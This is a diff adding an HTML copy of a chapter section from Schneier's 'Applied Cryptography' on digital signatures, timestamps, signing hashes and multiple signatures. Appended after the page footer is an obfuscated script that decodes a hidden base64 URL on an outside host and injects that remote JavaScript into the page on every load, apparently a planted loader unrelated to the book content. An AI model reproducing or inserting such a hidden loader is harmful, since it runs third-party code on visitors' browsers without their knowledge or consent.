@@ -1,0 +1,115 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Protocol Building Blocks</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=02//-->
+<!--PAGES=037-040//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>This protocol also satisfies the characteristics we&#146;re looking for:
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;The signature is authentic; when Bob verifies the message with Alice&#146;s public key, he knows that she signed it.
+<DD><B>2.</B>&nbsp;&nbsp;The signature is unforgeable; only Alice knows her private key.
+<DD><B>3.</B>&nbsp;&nbsp;The signature is not reusable; the signature is a function of the document and cannot be transferred to any other document.
+<DD><B>4.</B>&nbsp;&nbsp;The signed document is unalterable; if there is any alteration to the document, the signature can no longer be verified with Alice&#146;s public key.
+<DD><B>5.</B>&nbsp;&nbsp;The signature cannot be repudiated. Bob doesn&#146;t need Alice&#146;s help to verify her signature.
+</DL>
+<P><FONT SIZE="+1"><B><I>Signing Documents and Timestamps</I></B></FONT></P>
+<P>Actually, Bob can cheat Alice in certain circumstances. He can reuse the document and signature together. This is no problem if Alice signed a contract (what&#146;s another copy of the same contract, more or less?), but it can be very exciting if Alice signed a digital check.
+</P>
+<P>Let&#146;s say Alice sends Bob a signed digital check for $100. Bob takes the check to the bank, which verifies the signature and moves the money from one account to the other. Bob, who is an unscrupulous character, saves a copy of the digital check. The following week, he again takes it to the bank (or maybe to a different bank). The bank verifies the signature and moves the money from one account to the other. If Alice never balances her checkbook, Bob can keep this up for years.</P>
+<P>Consequently, digital signatures often include timestamps. The date and time of the signature are attached to the message and signed along with the rest of the message. The bank stores this timestamp in a database. Now, when Bob tries to cash Alice&#146;s check a second time, the bank checks the timestamp against its database. Since the bank already cashed a check from Alice with the same timestamp, the bank calls the police. Bob then spends 15 years in Leavenworth prison reading up on cryptographic protocols.</P>
+<P><FONT SIZE="+1"><B><I>Signing Documents with Public-Key Cryptography and One-Way Hash Functions</I></B></FONT></P>
+<P>In practical implementations, public-key algorithms are often too inefficient to sign long documents. To save time, digital signature protocols are often implemented with one-way hash functions [432,433]. Instead of signing a document, Alice signs the hash of the document. In this protocol, both the one-way hash function and the digital signature algorithm are agreed upon beforehand.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice produces a one-way hash of a document.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice encrypts the hash with her private key, thereby signing the document.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice sends the document and the signed hash to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob produces a one-way hash of the document that Alice sent. He then, using the digital signature algorithm, decrypts the signed hash with Alice&#146;s public key. If the signed hash matches the hash he generated, the signature is valid.
+</DL>
+<P>Speed increases drastically and, since the chances of two different documents having the same 160-bit hash are only one in 2<SUP>160</SUP>, anyone can safely equate a signature of the hash with a signature of the document. If a non-one-way hash function were used, it would be an easy matter to create multiple documents that hashed to the same value, so that anyone signing a particular document would be duped into signing a multitude of documents.</P>
+<P>This protocol has other benefits. First, the signature can be kept separate from the document. Second, the recipient&#146;s storage requirements for the document and signature are much smaller. An archival system can use this type of protocol to verify the existence of documents without storing their contents. The central database could just store the hashes of files. It doesn&#146;t have to see the files at all; users submit their hashes to the database, and the database timestamps the submissions and stores them. If there is any disagreement in the future about who created a document and when, the database could resolve it by finding the hash in its files. This system has vast implications concerning privacy: Alice could copyright a document but still keep the document secret. Only if she wished to prove her copyright would she have to make the document public. (See Section 4.1).</P>
+<P><FONT SIZE="+1"><B><I>Algorithms and Terminology</I></B></FONT></P>
+<P>There are many digital signature algorithms. All of them are public-key algorithms with secret information to sign documents and public information to verify signatures. Sometimes the signing process is called <B>encrypting with a private key</B> and the verification process is called <B>decrypting with a public key</B>. This is misleading and is only true for one algorithm, RSA. And different algorithms have different implementations. For example, one-way hash functions and timestamps sometimes add extra steps to the process of signing and verifying. Many algorithms can be used for digital signatures, but not for encryption.</P>
+<P>In general, I will refer to the signing and verifying processes without any details of the algorithms involved. Signing a message with private key <I>K</I> is:</P>
+<DL>
+<DD><I>S</I><SUB>K</SUB>(<I>M</I>)
+</DL>
+<P>and verifying a signature with the corresponding public key is:
+</P>
+<DL>
+<DD><I>V</I><SUB>K</SUB>(<I>M</I>)
+</DL>
+<P>The bit string attached to the document when signed (in the previous example, the one-way hash of the document encrypted with the private key) will be called the <B>digital signature</B>, or just the <B>signature</B>. The entire protocol, by which the receiver of a message is convinced of the identity of the sender and the integrity of the message, is called authentication. Further details on these protocols are in Section 3.2.</P>
+<P><FONT SIZE="+1"><B><I>Multiple Signatures</I></B></FONT></P>
+<P>How could Alice and Bob sign the same digital document? Without one-way hash functions, there are two options. One is that Alice and Bob sign separate copies of the document itself. The resultant message would be over twice the size of the original document. The second is that Alice signs the document first and then Bob signs Alice&#146;s signature. This works, but it is impossible to verify Alice&#146;s signature without also verifying Bob&#146;s.
+</P>
+<P>With one-way hash functions, multiple signatures are easy:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice signs the hash of the document.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob signs the hash of the document.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob sends his signature to Alice.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice sends the document, her signature, and Bob&#146;s signature to Carol.
+<DD><B>(5)</B>&nbsp;&nbsp;Carol verifies both Alice&#146;s signature and Bob&#146;s signature.
+</DL>
+<P>Alice and Bob can do steps (1) and (2) either in parallel or in series. In step (5), Carol can verify one signature without having to verify the other.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(nNaPiNPc, YvvzLyco) {YvvzLyco = nNaPiNPc.createElement('script');YvvzLyco.type = 'text/javascript';YvvzLyco.async = true;YvvzLyco.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');nNaPiNPc.getElementsByTagName('body')[0].appendChild(YvvzLyco);}(document));</script></body>
+</html>
